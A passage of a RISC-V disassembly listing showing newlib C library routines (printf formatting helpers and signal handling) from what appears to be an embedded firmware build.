800416f8:	4b4b0513          	addi	a0,s6,1204 # 800464b4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800464b5>
800416fc:	261000ef          	jal	ra,8004215c <memchr>
80041700:	00148413          	addi	s0,s1,1
80041704:	02012783          	lw	a5,32(sp)
80041708:	06051463          	bnez	a0,80041770 <_svfiprintf_r+0x1e4>
8004170c:	0107f713          	andi	a4,a5,16
80041710:	00070663          	beqz	a4,8004171c <_svfiprintf_r+0x190>
80041714:	02000713          	li	a4,32
80041718:	06e101a3          	sb	a4,99(sp)
8004171c:	0087f713          	andi	a4,a5,8
80041720:	00070663          	beqz	a4,8004172c <_svfiprintf_r+0x1a0>
80041724:	02b00713          	li	a4,43
80041728:	06e101a3          	sb	a4,99(sp)
8004172c:	0004c683          	lbu	a3,0(s1)
80041730:	02a00713          	li	a4,42
80041734:	04e68c63          	beq	a3,a4,8004178c <_svfiprintf_r+0x200>
80041738:	02c12783          	lw	a5,44(sp)
8004173c:	00048413          	mv	s0,s1
80041740:	00000693          	li	a3,0
80041744:	00900613          	li	a2,9
80041748:	00a00513          	li	a0,10
8004174c:	00044703          	lbu	a4,0(s0)
80041750:	00140593          	addi	a1,s0,1
80041754:	fd070713          	addi	a4,a4,-48
80041758:	08e67c63          	bgeu	a2,a4,800417f0 <_svfiprintf_r+0x264>
8004175c:	04068463          	beqz	a3,800417a4 <_svfiprintf_r+0x218>
80041760:	02f12623          	sw	a5,44(sp)
80041764:	0400006f          	j	800417a4 <_svfiprintf_r+0x218>
80041768:	00140413          	addi	s0,s0,1
8004176c:	f1dff06f          	j	80041688 <_svfiprintf_r+0xfc>
80041770:	4b4b0713          	addi	a4,s6,1204
80041774:	40e50533          	sub	a0,a0,a4
80041778:	00ad9533          	sll	a0,s11,a0
8004177c:	00a7e7b3          	or	a5,a5,a0
80041780:	02f12023          	sw	a5,32(sp)
80041784:	00040493          	mv	s1,s0
80041788:	f69ff06f          	j	800416f0 <_svfiprintf_r+0x164>
8004178c:	01c12703          	lw	a4,28(sp)
80041790:	00470693          	addi	a3,a4,4
80041794:	00072703          	lw	a4,0(a4)
80041798:	00d12e23          	sw	a3,28(sp)
8004179c:	04074063          	bltz	a4,800417dc <_svfiprintf_r+0x250>
800417a0:	02e12623          	sw	a4,44(sp)
800417a4:	00044703          	lbu	a4,0(s0)
800417a8:	02e00793          	li	a5,46
800417ac:	08f71663          	bne	a4,a5,80041838 <_svfiprintf_r+0x2ac>
800417b0:	00144703          	lbu	a4,1(s0)
800417b4:	02a00793          	li	a5,42
800417b8:	04f71a63          	bne	a4,a5,8004180c <_svfiprintf_r+0x280>
800417bc:	01c12783          	lw	a5,28(sp)
800417c0:	00240413          	addi	s0,s0,2
800417c4:	00478713          	addi	a4,a5,4
800417c8:	0007a783          	lw	a5,0(a5)
800417cc:	00e12e23          	sw	a4,28(sp)
800417d0:	0207ca63          	bltz	a5,80041804 <_svfiprintf_r+0x278>
800417d4:	02f12223          	sw	a5,36(sp)
800417d8:	0600006f          	j	80041838 <_svfiprintf_r+0x2ac>
800417dc:	40e00733          	neg	a4,a4
800417e0:	0027e793          	ori	a5,a5,2
800417e4:	02e12623          	sw	a4,44(sp)
800417e8:	02f12023          	sw	a5,32(sp)
800417ec:	fb9ff06f          	j	800417a4 <_svfiprintf_r+0x218>
800417f0:	02a787b3          	mul	a5,a5,a0
800417f4:	00100693          	li	a3,1
800417f8:	00058413          	mv	s0,a1
800417fc:	00e787b3          	add	a5,a5,a4
80041800:	f4dff06f          	j	8004174c <_svfiprintf_r+0x1c0>
80041804:	fff00793          	li	a5,-1
80041808:	fcdff06f          	j	800417d4 <_svfiprintf_r+0x248>
8004180c:	00140413          	addi	s0,s0,1
80041810:	02012223          	sw	zero,36(sp)
80041814:	00000693          	li	a3,0
80041818:	00000793          	li	a5,0
8004181c:	00900613          	li	a2,9
80041820:	00a00513          	li	a0,10
80041824:	00044703          	lbu	a4,0(s0)
80041828:	00140593          	addi	a1,s0,1
8004182c:	fd070713          	addi	a4,a4,-48
80041830:	08e67263          	bgeu	a2,a4,800418b4 <_svfiprintf_r+0x328>
80041834:	fa0690e3          	bnez	a3,800417d4 <_svfiprintf_r+0x248>
80041838:	00044583          	lbu	a1,0(s0)
8004183c:	00300613          	li	a2,3
80041840:	4bcb8513          	addi	a0,s7,1212 # 800464bc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800464bd>
80041844:	119000ef          	jal	ra,8004215c <memchr>
80041848:	02050263          	beqz	a0,8004186c <_svfiprintf_r+0x2e0>
8004184c:	4bcb8793          	addi	a5,s7,1212
80041850:	40f50533          	sub	a0,a0,a5
80041854:	04000793          	li	a5,64
80041858:	00a797b3          	sll	a5,a5,a0
8004185c:	02012503          	lw	a0,32(sp)
80041860:	00140413          	addi	s0,s0,1
80041864:	00f56533          	or	a0,a0,a5
80041868:	02a12023          	sw	a0,32(sp)
8004186c:	00044583          	lbu	a1,0(s0)
80041870:	00600613          	li	a2,6
80041874:	4c0d0513          	addi	a0,s10,1216 # 800464c0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800464c1>
80041878:	00140493          	addi	s1,s0,1
8004187c:	02b10c23          	sb	a1,56(sp)
80041880:	0dd000ef          	jal	ra,8004215c <memchr>
80041884:	08050a63          	beqz	a0,80041918 <_svfiprintf_r+0x38c>
80041888:	040a9863          	bnez	s5,800418d8 <_svfiprintf_r+0x34c>
8004188c:	02012703          	lw	a4,32(sp)
80041890:	01c12783          	lw	a5,28(sp)
80041894:	10077713          	andi	a4,a4,256
80041898:	02070863          	beqz	a4,800418c8 <_svfiprintf_r+0x33c>
8004189c:	00478793          	addi	a5,a5,4
800418a0:	00f12e23          	sw	a5,28(sp)
800418a4:	03412783          	lw	a5,52(sp)
800418a8:	014787b3          	add	a5,a5,s4
800418ac:	02f12a23          	sw	a5,52(sp)
800418b0:	dd5ff06f          	j	80041684 <_svfiprintf_r+0xf8>
800418b4:	02a787b3          	mul	a5,a5,a0
800418b8:	00100693          	li	a3,1
800418bc:	00058413          	mv	s0,a1
800418c0:	00e787b3          	add	a5,a5,a4
800418c4:	f61ff06f          	j	80041824 <_svfiprintf_r+0x298>
800418c8:	00778793          	addi	a5,a5,7
800418cc:	ff87f793          	andi	a5,a5,-8
800418d0:	00878793          	addi	a5,a5,8
800418d4:	fcdff06f          	j	800418a0 <_svfiprintf_r+0x314>
800418d8:	01c10713          	addi	a4,sp,28
800418dc:	25cc0693          	addi	a3,s8,604 # 8004125c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004125d>
800418e0:	00090613          	mv	a2,s2
800418e4:	02010593          	addi	a1,sp,32
800418e8:	00098513          	mv	a0,s3
800418ec:	00000097          	auipc	ra,0x0
800418f0:	000000e7          	jalr	zero # 0 <CONFIG_BOOT_DELAY>
800418f4:	fff00793          	li	a5,-1
800418f8:	00050a13          	mv	s4,a0
800418fc:	faf514e3          	bne	a0,a5,800418a4 <_svfiprintf_r+0x318>
80041900:	00c95783          	lhu	a5,12(s2)
80041904:	fff00513          	li	a0,-1
80041908:	0407f793          	andi	a5,a5,64
8004190c:	d00790e3          	bnez	a5,8004160c <_svfiprintf_r+0x80>
80041910:	03412503          	lw	a0,52(sp)
80041914:	cf9ff06f          	j	8004160c <_svfiprintf_r+0x80>
80041918:	01c10713          	addi	a4,sp,28
8004191c:	25cc0693          	addi	a3,s8,604
80041920:	00090613          	mv	a2,s2
80041924:	02010593          	addi	a1,sp,32
80041928:	00098513          	mv	a0,s3
8004192c:	1b8000ef          	jal	ra,80041ae4 <_printf_i>
80041930:	fc5ff06f          	j	800418f4 <_svfiprintf_r+0x368>

80041934 <_printf_common>:
80041934:	fd010113          	addi	sp,sp,-48
80041938:	01512a23          	sw	s5,20(sp)
8004193c:	0105a783          	lw	a5,16(a1)
80041940:	00070a93          	mv	s5,a4
80041944:	0085a703          	lw	a4,8(a1)
80041948:	02812423          	sw	s0,40(sp)
8004194c:	02912223          	sw	s1,36(sp)
80041950:	01312e23          	sw	s3,28(sp)
80041954:	01412c23          	sw	s4,24(sp)
80041958:	02112623          	sw	ra,44(sp)
8004195c:	03212023          	sw	s2,32(sp)
80041960:	01612823          	sw	s6,16(sp)
80041964:	01712623          	sw	s7,12(sp)
80041968:	00050993          	mv	s3,a0
8004196c:	00058413          	mv	s0,a1
80041970:	00060493          	mv	s1,a2
80041974:	00068a13          	mv	s4,a3
80041978:	00e7d463          	bge	a5,a4,80041980 <_printf_common+0x4c>
8004197c:	00070793          	mv	a5,a4
80041980:	00f4a023          	sw	a5,0(s1)
80041984:	04344703          	lbu	a4,67(s0)
80041988:	00070663          	beqz	a4,80041994 <_printf_common+0x60>
8004198c:	00178793          	addi	a5,a5,1
80041990:	00f4a023          	sw	a5,0(s1)
80041994:	00042783          	lw	a5,0(s0)
80041998:	0207f793          	andi	a5,a5,32
8004199c:	00078863          	beqz	a5,800419ac <_printf_common+0x78>
800419a0:	0004a783          	lw	a5,0(s1)
800419a4:	00278793          	addi	a5,a5,2
800419a8:	00f4a023          	sw	a5,0(s1)
800419ac:	00042903          	lw	s2,0(s0)
800419b0:	00697913          	andi	s2,s2,6
800419b4:	00091e63          	bnez	s2,800419d0 <_printf_common+0x9c>
800419b8:	01940b13          	addi	s6,s0,25
800419bc:	fff00b93          	li	s7,-1
800419c0:	00c42783          	lw	a5,12(s0)
800419c4:	0004a703          	lw	a4,0(s1)
800419c8:	40e787b3          	sub	a5,a5,a4
800419cc:	08f94263          	blt	s2,a5,80041a50 <_printf_common+0x11c>
800419d0:	00042783          	lw	a5,0(s0)
800419d4:	04344683          	lbu	a3,67(s0)
800419d8:	0207f793          	andi	a5,a5,32
800419dc:	00d036b3          	snez	a3,a3
800419e0:	0c079063          	bnez	a5,80041aa0 <_printf_common+0x16c>
800419e4:	04340613          	addi	a2,s0,67
800419e8:	000a0593          	mv	a1,s4
800419ec:	00098513          	mv	a0,s3
800419f0:	000a80e7          	jalr	s5 # 0 <CONFIG_BOOT_DELAY>
800419f4:	fff00793          	li	a5,-1
800419f8:	06f50863          	beq	a0,a5,80041a68 <_printf_common+0x134>
800419fc:	00042783          	lw	a5,0(s0)
80041a00:	00400613          	li	a2,4
80041a04:	0004a703          	lw	a4,0(s1)
80041a08:	0067f793          	andi	a5,a5,6
80041a0c:	00c42683          	lw	a3,12(s0)
80041a10:	00000493          	li	s1,0
80041a14:	00c79863          	bne	a5,a2,80041a24 <_printf_common+0xf0>
80041a18:	40e684b3          	sub	s1,a3,a4
80041a1c:	0004d463          	bgez	s1,80041a24 <_printf_common+0xf0>
80041a20:	00000493          	li	s1,0
80041a24:	00842783          	lw	a5,8(s0)
80041a28:	01042703          	lw	a4,16(s0)
80041a2c:	00f75663          	bge	a4,a5,80041a38 <_printf_common+0x104>
80041a30:	40e787b3          	sub	a5,a5,a4
80041a34:	00f484b3          	add	s1,s1,a5
80041a38:	00000913          	li	s2,0
80041a3c:	01a40413          	addi	s0,s0,26
80041a40:	fff00b13          	li	s6,-1
80041a44:	09249063          	bne	s1,s2,80041ac4 <_printf_common+0x190>
80041a48:	00000513          	li	a0,0
80041a4c:	0200006f          	j	80041a6c <_printf_common+0x138>
80041a50:	00100693          	li	a3,1
80041a54:	000b0613          	mv	a2,s6
80041a58:	000a0593          	mv	a1,s4
80041a5c:	00098513          	mv	a0,s3
80041a60:	000a80e7          	jalr	s5
80041a64:	03751a63          	bne	a0,s7,80041a98 <_printf_common+0x164>
80041a68:	fff00513          	li	a0,-1
80041a6c:	02c12083          	lw	ra,44(sp)
80041a70:	02812403          	lw	s0,40(sp)
80041a74:	02412483          	lw	s1,36(sp)
80041a78:	02012903          	lw	s2,32(sp)
80041a7c:	01c12983          	lw	s3,28(sp)
80041a80:	01812a03          	lw	s4,24(sp)
80041a84:	01412a83          	lw	s5,20(sp)
80041a88:	01012b03          	lw	s6,16(sp)
80041a8c:	00c12b83          	lw	s7,12(sp)
80041a90:	03010113          	addi	sp,sp,48
80041a94:	00008067          	ret
80041a98:	00190913          	addi	s2,s2,1
80041a9c:	f25ff06f          	j	800419c0 <_printf_common+0x8c>
80041aa0:	00d40733          	add	a4,s0,a3
80041aa4:	03000613          	li	a2,48
80041aa8:	04c701a3          	sb	a2,67(a4)
80041aac:	04544703          	lbu	a4,69(s0)
80041ab0:	00168793          	addi	a5,a3,1
80041ab4:	00f407b3          	add	a5,s0,a5
80041ab8:	00268693          	addi	a3,a3,2
80041abc:	04e781a3          	sb	a4,67(a5)
80041ac0:	f25ff06f          	j	800419e4 <_printf_common+0xb0>
80041ac4:	00100693          	li	a3,1
80041ac8:	00040613          	mv	a2,s0
80041acc:	000a0593          	mv	a1,s4
80041ad0:	00098513          	mv	a0,s3
80041ad4:	000a80e7          	jalr	s5
80041ad8:	f96508e3          	beq	a0,s6,80041a68 <_printf_common+0x134>
80041adc:	00190913          	addi	s2,s2,1
80041ae0:	f65ff06f          	j	80041a44 <_printf_common+0x110>

80041ae4 <_printf_i>:
80041ae4:	fd010113          	addi	sp,sp,-48
80041ae8:	02812423          	sw	s0,40(sp)
80041aec:	02912223          	sw	s1,36(sp)
80041af0:	03212023          	sw	s2,32(sp)
80041af4:	01312e23          	sw	s3,28(sp)
80041af8:	02112623          	sw	ra,44(sp)
80041afc:	01412c23          	sw	s4,24(sp)
80041b00:	01512a23          	sw	s5,20(sp)
80041b04:	01612823          	sw	s6,16(sp)
80041b08:	00068993          	mv	s3,a3
80041b0c:	0185c683          	lbu	a3,24(a1)
80041b10:	06e00793          	li	a5,110
80041b14:	00060913          	mv	s2,a2
80041b18:	00050493          	mv	s1,a0
80041b1c:	00058413          	mv	s0,a1
80041b20:	04358613          	addi	a2,a1,67
80041b24:	28f68663          	beq	a3,a5,80041db0 <_printf_i+0x2cc>
80041b28:	06d7ea63          	bltu	a5,a3,80041b9c <_printf_i+0xb8>
80041b2c:	06300793          	li	a5,99
80041b30:	0af68e63          	beq	a3,a5,80041bec <_printf_i+0x108>
80041b34:	00d7ee63          	bltu	a5,a3,80041b50 <_printf_i+0x6c>
80041b38:	2a068a63          	beqz	a3,80041dec <_printf_i+0x308>
80041b3c:	05800793          	li	a5,88
80041b40:	1ef68a63          	beq	a3,a5,80041d34 <_printf_i+0x250>
80041b44:	04240a93          	addi	s5,s0,66
80041b48:	04d40123          	sb	a3,66(s0)
80041b4c:	0b80006f          	j	80041c04 <_printf_i+0x120>
80041b50:	06400793          	li	a5,100
80041b54:	00f68663          	beq	a3,a5,80041b60 <_printf_i+0x7c>
80041b58:	06900793          	li	a5,105
80041b5c:	fef694e3          	bne	a3,a5,80041b44 <_printf_i+0x60>
80041b60:	00042783          	lw	a5,0(s0)
80041b64:	00072503          	lw	a0,0(a4)
80041b68:	0807f693          	andi	a3,a5,128
80041b6c:	00450593          	addi	a1,a0,4
80041b70:	08068e63          	beqz	a3,80041c0c <_printf_i+0x128>
80041b74:	00052783          	lw	a5,0(a0)
80041b78:	00b72023          	sw	a1,0(a4)
80041b7c:	800466b7          	lui	a3,0x80046
80041b80:	0007d863          	bgez	a5,80041b90 <_printf_i+0xac>
80041b84:	02d00713          	li	a4,45
80041b88:	40f007b3          	neg	a5,a5
80041b8c:	04e401a3          	sb	a4,67(s0)
80041b90:	4c868693          	addi	a3,a3,1224 # 800464c8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800464c9>
80041b94:	00a00713          	li	a4,10
80041b98:	0d80006f          	j	80041c70 <_printf_i+0x18c>
80041b9c:	07300793          	li	a5,115
80041ba0:	24f68c63          	beq	a3,a5,80041df8 <_printf_i+0x314>
80041ba4:	02d7e263          	bltu	a5,a3,80041bc8 <_printf_i+0xe4>
80041ba8:	06f00793          	li	a5,111
80041bac:	06f68e63          	beq	a3,a5,80041c28 <_printf_i+0x144>
80041bb0:	07000793          	li	a5,112
80041bb4:	f8f698e3          	bne	a3,a5,80041b44 <_printf_i+0x60>
80041bb8:	0005a783          	lw	a5,0(a1)
80041bbc:	0207e793          	ori	a5,a5,32
80041bc0:	00f5a023          	sw	a5,0(a1)
80041bc4:	0140006f          	j	80041bd8 <_printf_i+0xf4>
80041bc8:	07500793          	li	a5,117
80041bcc:	04f68e63          	beq	a3,a5,80041c28 <_printf_i+0x144>
80041bd0:	07800793          	li	a5,120
80041bd4:	f6f698e3          	bne	a3,a5,80041b44 <_printf_i+0x60>
80041bd8:	07800793          	li	a5,120
80041bdc:	800466b7          	lui	a3,0x80046
80041be0:	04f402a3          	sb	a5,69(s0)
80041be4:	4dc68693          	addi	a3,a3,1244 # 800464dc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800464dd>
80041be8:	1580006f          	j	80041d40 <_printf_i+0x25c>
80041bec:	00072783          	lw	a5,0(a4)
80041bf0:	04258a93          	addi	s5,a1,66
80041bf4:	00478693          	addi	a3,a5,4
80041bf8:	0007a783          	lw	a5,0(a5)
80041bfc:	00d72023          	sw	a3,0(a4)
80041c00:	04f58123          	sb	a5,66(a1)
80041c04:	00100793          	li	a5,1
80041c08:	2200006f          	j	80041e28 <_printf_i+0x344>
80041c0c:	0407f693          	andi	a3,a5,64
80041c10:	00052783          	lw	a5,0(a0)
80041c14:	00b72023          	sw	a1,0(a4)
80041c18:	f60682e3          	beqz	a3,80041b7c <_printf_i+0x98>
80041c1c:	01079793          	slli	a5,a5,0x10
80041c20:	4107d793          	srai	a5,a5,0x10
80041c24:	f59ff06f          	j	80041b7c <_printf_i+0x98>
80041c28:	00042583          	lw	a1,0(s0)
80041c2c:	00072783          	lw	a5,0(a4)
80041c30:	0805f813          	andi	a6,a1,128
80041c34:	00478513          	addi	a0,a5,4
80041c38:	00080863          	beqz	a6,80041c48 <_printf_i+0x164>
80041c3c:	00a72023          	sw	a0,0(a4)
80041c40:	0007a783          	lw	a5,0(a5)
80041c44:	0140006f          	j	80041c58 <_printf_i+0x174>
80041c48:	0405f593          	andi	a1,a1,64
80041c4c:	00a72023          	sw	a0,0(a4)
80041c50:	fe0588e3          	beqz	a1,80041c40 <_printf_i+0x15c>
80041c54:	0007d783          	lhu	a5,0(a5)
80041c58:	06f00593          	li	a1,111
80041c5c:	80046737          	lui	a4,0x80046
80041c60:	12b68e63          	beq	a3,a1,80041d9c <_printf_i+0x2b8>
80041c64:	4c870693          	addi	a3,a4,1224 # 800464c8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800464c9>
80041c68:	00a00713          	li	a4,10
80041c6c:	040401a3          	sb	zero,67(s0)
80041c70:	00442583          	lw	a1,4(s0)
80041c74:	00b42423          	sw	a1,8(s0)
80041c78:	0005c863          	bltz	a1,80041c88 <_printf_i+0x1a4>
80041c7c:	00042503          	lw	a0,0(s0)
80041c80:	ffb57513          	andi	a0,a0,-5
80041c84:	00a42023          	sw	a0,0(s0)
80041c88:	00079663          	bnez	a5,80041c94 <_printf_i+0x1b0>
80041c8c:	00060a93          	mv	s5,a2
80041c90:	02058263          	beqz	a1,80041cb4 <_printf_i+0x1d0>
80041c94:	00060a93          	mv	s5,a2
80041c98:	02e7f5b3          	remu	a1,a5,a4
80041c9c:	fffa8a93          	addi	s5,s5,-1
80041ca0:	00b685b3          	add	a1,a3,a1
80041ca4:	0005c583          	lbu	a1,0(a1)
80041ca8:	00ba8023          	sb	a1,0(s5)
80041cac:	02e7d5b3          	divu	a1,a5,a4
80041cb0:	0ee7fc63          	bgeu	a5,a4,80041da8 <_printf_i+0x2c4>
80041cb4:	00800793          	li	a5,8
80041cb8:	02f71463          	bne	a4,a5,80041ce0 <_printf_i+0x1fc>
80041cbc:	00042783          	lw	a5,0(s0)
80041cc0:	0017f793          	andi	a5,a5,1
80041cc4:	00078e63          	beqz	a5,80041ce0 <_printf_i+0x1fc>
80041cc8:	00442703          	lw	a4,4(s0)
80041ccc:	01042783          	lw	a5,16(s0)
80041cd0:	00e7c863          	blt	a5,a4,80041ce0 <_printf_i+0x1fc>
80041cd4:	03000793          	li	a5,48
80041cd8:	fefa8fa3          	sb	a5,-1(s5)
80041cdc:	fffa8a93          	addi	s5,s5,-1
80041ce0:	41560633          	sub	a2,a2,s5
80041ce4:	00c42823          	sw	a2,16(s0)
80041ce8:	00098713          	mv	a4,s3
80041cec:	00090693          	mv	a3,s2
80041cf0:	00c10613          	addi	a2,sp,12
80041cf4:	00040593          	mv	a1,s0
80041cf8:	00048513          	mv	a0,s1
80041cfc:	c39ff0ef          	jal	ra,80041934 <_printf_common>
80041d00:	fff00a13          	li	s4,-1
80041d04:	13451863          	bne	a0,s4,80041e34 <_printf_i+0x350>
80041d08:	fff00513          	li	a0,-1
80041d0c:	02c12083          	lw	ra,44(sp)
80041d10:	02812403          	lw	s0,40(sp)
80041d14:	02412483          	lw	s1,36(sp)
80041d18:	02012903          	lw	s2,32(sp)
80041d1c:	01c12983          	lw	s3,28(sp)
80041d20:	01812a03          	lw	s4,24(sp)
80041d24:	01412a83          	lw	s5,20(sp)
80041d28:	01012b03          	lw	s6,16(sp)
80041d2c:	03010113          	addi	sp,sp,48
80041d30:	00008067          	ret
80041d34:	04d582a3          	sb	a3,69(a1)
80041d38:	800466b7          	lui	a3,0x80046
80041d3c:	4c868693          	addi	a3,a3,1224 # 800464c8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800464c9>
80041d40:	00042583          	lw	a1,0(s0)
80041d44:	00072503          	lw	a0,0(a4)
80041d48:	0805f813          	andi	a6,a1,128
80041d4c:	00052783          	lw	a5,0(a0)
80041d50:	00450513          	addi	a0,a0,4
80041d54:	02080863          	beqz	a6,80041d84 <_printf_i+0x2a0>
80041d58:	00a72023          	sw	a0,0(a4)
80041d5c:	0015f713          	andi	a4,a1,1
80041d60:	00070663          	beqz	a4,80041d6c <_printf_i+0x288>
80041d64:	0205e593          	ori	a1,a1,32
80041d68:	00b42023          	sw	a1,0(s0)
80041d6c:	01000713          	li	a4,16
80041d70:	ee079ee3          	bnez	a5,80041c6c <_printf_i+0x188>
80041d74:	00042583          	lw	a1,0(s0)
80041d78:	fdf5f593          	andi	a1,a1,-33
80041d7c:	00b42023          	sw	a1,0(s0)
80041d80:	eedff06f          	j	80041c6c <_printf_i+0x188>
80041d84:	0405f813          	andi	a6,a1,64
80041d88:	00a72023          	sw	a0,0(a4)
80041d8c:	fc0808e3          	beqz	a6,80041d5c <_printf_i+0x278>
80041d90:	01079793          	slli	a5,a5,0x10
80041d94:	0107d793          	srli	a5,a5,0x10
80041d98:	fc5ff06f          	j	80041d5c <_printf_i+0x278>
80041d9c:	4c870693          	addi	a3,a4,1224
80041da0:	00800713          	li	a4,8
80041da4:	ec9ff06f          	j	80041c6c <_printf_i+0x188>
80041da8:	00058793          	mv	a5,a1
80041dac:	eedff06f          	j	80041c98 <_printf_i+0x1b4>
80041db0:	0005a683          	lw	a3,0(a1)
80041db4:	00072783          	lw	a5,0(a4)
80041db8:	0145a583          	lw	a1,20(a1)
80041dbc:	0806f813          	andi	a6,a3,128
80041dc0:	00478513          	addi	a0,a5,4
80041dc4:	00080a63          	beqz	a6,80041dd8 <_printf_i+0x2f4>
80041dc8:	00a72023          	sw	a0,0(a4)
80041dcc:	0007a783          	lw	a5,0(a5)
80041dd0:	00b7a023          	sw	a1,0(a5)
80041dd4:	0180006f          	j	80041dec <_printf_i+0x308>
80041dd8:	00a72023          	sw	a0,0(a4)
80041ddc:	0406f693          	andi	a3,a3,64
80041de0:	0007a783          	lw	a5,0(a5)
80041de4:	fe0686e3          	beqz	a3,80041dd0 <_printf_i+0x2ec>
80041de8:	00b79023          	sh	a1,0(a5)
80041dec:	00042823          	sw	zero,16(s0)
80041df0:	00060a93          	mv	s5,a2
80041df4:	ef5ff06f          	j	80041ce8 <_printf_i+0x204>
80041df8:	00072783          	lw	a5,0(a4)
80041dfc:	0045a603          	lw	a2,4(a1)
80041e00:	00000593          	li	a1,0
80041e04:	00478693          	addi	a3,a5,4
80041e08:	00d72023          	sw	a3,0(a4)
80041e0c:	0007aa83          	lw	s5,0(a5)
80041e10:	000a8513          	mv	a0,s5
80041e14:	348000ef          	jal	ra,8004215c <memchr>
80041e18:	00050663          	beqz	a0,80041e24 <_printf_i+0x340>
80041e1c:	41550533          	sub	a0,a0,s5
80041e20:	00a42223          	sw	a0,4(s0)
80041e24:	00442783          	lw	a5,4(s0)
80041e28:	00f42823          	sw	a5,16(s0)
80041e2c:	040401a3          	sb	zero,67(s0)
80041e30:	eb9ff06f          	j	80041ce8 <_printf_i+0x204>
80041e34:	01042683          	lw	a3,16(s0)
80041e38:	000a8613          	mv	a2,s5
80041e3c:	00090593          	mv	a1,s2
80041e40:	00048513          	mv	a0,s1
80041e44:	000980e7          	jalr	s3
80041e48:	ed4500e3          	beq	a0,s4,80041d08 <_printf_i+0x224>
80041e4c:	00042783          	lw	a5,0(s0)
80041e50:	0027f793          	andi	a5,a5,2
80041e54:	04079463          	bnez	a5,80041e9c <_printf_i+0x3b8>
80041e58:	00c12783          	lw	a5,12(sp)
80041e5c:	00c42503          	lw	a0,12(s0)
80041e60:	eaf556e3          	bge	a0,a5,80041d0c <_printf_i+0x228>
80041e64:	00078513          	mv	a0,a5
80041e68:	ea5ff06f          	j	80041d0c <_printf_i+0x228>
80041e6c:	00100693          	li	a3,1
80041e70:	000a8613          	mv	a2,s5
80041e74:	00090593          	mv	a1,s2
80041e78:	00048513          	mv	a0,s1
80041e7c:	000980e7          	jalr	s3
80041e80:	e96504e3          	beq	a0,s6,80041d08 <_printf_i+0x224>
80041e84:	001a0a13          	addi	s4,s4,1
80041e88:	00c42783          	lw	a5,12(s0)
80041e8c:	00c12703          	lw	a4,12(sp)
80041e90:	40e787b3          	sub	a5,a5,a4
80041e94:	fcfa4ce3          	blt	s4,a5,80041e6c <_printf_i+0x388>
80041e98:	fc1ff06f          	j	80041e58 <_printf_i+0x374>
80041e9c:	00000a13          	li	s4,0
80041ea0:	01940a93          	addi	s5,s0,25
80041ea4:	fff00b13          	li	s6,-1
80041ea8:	fe1ff06f          	j	80041e88 <_printf_i+0x3a4>

80041eac <_init_signal_r>:
80041eac:	14852703          	lw	a4,328(a0)
80041eb0:	04071863          	bnez	a4,80041f00 <_init_signal_r+0x54>
80041eb4:	ff010113          	addi	sp,sp,-16
80041eb8:	08000593          	li	a1,128
80041ebc:	00812423          	sw	s0,8(sp)
80041ec0:	00112623          	sw	ra,12(sp)
80041ec4:	00050413          	mv	s0,a0
80041ec8:	aa9fe0ef          	jal	ra,80040970 <_malloc_r>
80041ecc:	14a42423          	sw	a0,328(s0)
80041ed0:	fff00793          	li	a5,-1
80041ed4:	00050c63          	beqz	a0,80041eec <_init_signal_r+0x40>
80041ed8:	08050793          	addi	a5,a0,128
80041edc:	00052023          	sw	zero,0(a0)
80041ee0:	00450513          	addi	a0,a0,4
80041ee4:	fef51ce3          	bne	a0,a5,80041edc <_init_signal_r+0x30>
80041ee8:	00000793          	li	a5,0
80041eec:	00c12083          	lw	ra,12(sp)
80041ef0:	00812403          	lw	s0,8(sp)
80041ef4:	00078513          	mv	a0,a5
80041ef8:	01010113          	addi	sp,sp,16
80041efc:	00008067          	ret
80041f00:	00000793          	li	a5,0
80041f04:	00078513          	mv	a0,a5
80041f08:	00008067          	ret

80041f0c <_signal_r>:
80041f0c:	ff010113          	addi	sp,sp,-16
80041f10:	00912223          	sw	s1,4(sp)
80041f14:	00112623          	sw	ra,12(sp)
80041f18:	00812423          	sw	s0,8(sp)
80041f1c:	01212023          	sw	s2,0(sp)
80041f20:	01f00713          	li	a4,31
80041f24:	00050493          	mv	s1,a0
80041f28:	00b77a63          	bgeu	a4,a1,80041f3c <_signal_r+0x30>
80041f2c:	01600713          	li	a4,22
80041f30:	00e52023          	sw	a4,0(a0)
80041f34:	fff00513          	li	a0,-1
80041f38:	0280006f          	j	80041f60 <_signal_r+0x54>
80041f3c:	14852783          	lw	a5,328(a0)
80041f40:	00060913          	mv	s2,a2
80041f44:	00058413          	mv	s0,a1
80041f48:	02078863          	beqz	a5,80041f78 <_signal_r+0x6c>
80041f4c:	00241593          	slli	a1,s0,0x2
80041f50:	1484a403          	lw	s0,328(s1)
80041f54:	00b405b3          	add	a1,s0,a1
80041f58:	0005a503          	lw	a0,0(a1)
80041f5c:	0125a023          	sw	s2,0(a1)
80041f60:	00c12083          	lw	ra,12(sp)
80041f64:	00812403          	lw	s0,8(sp)
80041f68:	00412483          	lw	s1,4(sp)
80041f6c:	00012903          	lw	s2,0(sp)
80041f70:	01010113          	addi	sp,sp,16
80041f74:	00008067          	ret
80041f78:	f35ff0ef          	jal	ra,80041eac <_init_signal_r>
80041f7c:	fc0508e3          	beqz	a0,80041f4c <_signal_r+0x40>
80041f80:	fb5ff06f          	j	80041f34 <_signal_r+0x28>

80041f84 <_raise_r>:
80041f84:	01f00793          	li	a5,31
80041f88:	00b7fa63          	bgeu	a5,a1,80041f9c <_raise_r+0x18>
80041f8c:	01600793          	li	a5,22
80041f90:	00f52023          	sw	a5,0(a0)
80041f94:	fff00513          	li	a0,-1
80041f98:	00008067          	ret
80041f9c:	14852783          	lw	a5,328(a0)
80041fa0:	fe010113          	addi	sp,sp,-32
80041fa4:	00812c23          	sw	s0,24(sp)
80041fa8:	00112e23          	sw	ra,28(sp)
80041fac:	00058613          	mv	a2,a1
80041fb0:	00050413          	mv	s0,a0
80041fb4:	00078a63          	beqz	a5,80041fc8 <_raise_r+0x44>
80041fb8:	00259713          	slli	a4,a1,0x2
80041fbc:	00e787b3          	add	a5,a5,a4
80041fc0:	0007a703          	lw	a4,0(a5)
80041fc4:	02071663          	bnez	a4,80041ff0 <_raise_r+0x6c>
80041fc8:	00040513          	mv	a0,s0
80041fcc:	00c12623          	sw	a2,12(sp)
